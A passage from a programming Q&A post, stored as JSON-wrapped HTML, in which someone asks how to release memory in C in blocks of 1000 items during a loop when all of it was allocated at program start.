DoSomeWork(test[i]);\n   if(i%1000==0)\n       releaseMemory(i-1000,i);\n</code></pre>\n\n<p>How can I do it in c?</p>\n\n<p>I know that <code>free</code> can only free all of my allocate, but I don't want to wait to the end of work the free all the memory.</p>\n\n<p>I want each 1000 works free all the 1000 back</p>\n\n<p>I must to allocate all the memory in the begining of program.</p>\n"}]